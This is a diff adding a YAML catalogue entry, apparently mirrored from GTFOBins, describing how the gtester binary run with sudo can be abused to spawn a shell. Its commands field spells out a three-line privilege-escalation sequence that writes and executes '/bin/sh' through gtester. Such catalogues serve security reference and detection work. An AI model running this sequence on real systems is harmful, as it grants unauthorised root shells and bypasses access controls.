@@ -1,0 +1,28 @@
+id: gtfobins/gtester/shell/sudo
+type: binary
+platform: linux
+name: gtester
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo ''exec /bin/sh 0<&1'' >/path/to/temp-file
+
+    chmod +x /path/to/temp-file
+
+    gtester -q /path/to/temp-file'
+references:
+- https://gtfobins.github.io/gtfobins/gtester/
+tags:
+- linux
+- unix
+- gtfobins
